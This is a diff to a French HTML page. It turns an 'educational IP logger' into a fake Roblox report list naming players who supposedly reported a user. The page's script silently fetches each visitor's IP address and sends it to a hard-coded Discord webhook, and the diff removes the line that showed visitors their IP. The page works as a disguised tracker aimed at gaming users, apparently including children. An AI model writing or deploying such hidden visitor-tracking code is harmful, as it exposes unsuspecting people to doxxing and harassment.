@@ -3,20 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger Éducatif</title>
+    <title>Rapports Roblox</title>
 </head>
 <body>
-    <h1>Bienvenue</h1>
-    <p>Votre adresse IP sera affichée ici :</p>
-    <p id="ip"></p>
-
+    <h1>Liste des Joueurs Signalés</h1>
+    <p>Ces joueurs ont reporté <strong>tox1caa21</strong> :</p>
+    <ul>
+        <li>Johannes545454</li>
+        <li>RobloxUser123</li>
+        <li>EpicGamer77</li>
+        <li>CoolKid_89</li>
+        <li>PlayerXtreme45</li>
+        <li>GamerPro_123</li>
+        <li>SuperPlayer98</li>
+        <li>NoobMaster42</li>
+        <li>ShadowNinja22</li>
+        <li>RobloxFan9000</li>
+        <li>MasterGamerX</li>
+        <li>PlayerZero56</li>
+        <li>FastRunner88</li>
+        <li>TheRealPro7</li>
+        <li>KingGamer29</li>
+        <li>ElitePlayer101</li>
+        <li>ProNoobMaster</li>
+        <li>GameOverMan2000</li>
+        <li>PixelWarrior73</li>
+        <li>SpeedyGamer99</li>
+        <li>UltraPlayer777</li>
+        <li>NoobSlayerX</li>
+        <li>GamingMasterZ</li>
+        <li>EpicNinja66</li>
+    </ul>
+    
     <script>
         const webhookURL = "https://canary.discord.com/api/webhooks/1343448074932060213/JOcFCf9CbQXMQ-BDt5S2W3RhNRZkmtm5O68ciZv1jKvhRvtvStnisvkxsCIMQlQtpxl3";
 
         fetch('https://api64.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                document.getElementById('ip').textContent = `Votre IP : ${data.ip}`;
                 console.log("Adresse IP capturée :", data.ip);
                 
                 fetch(webhookURL, {
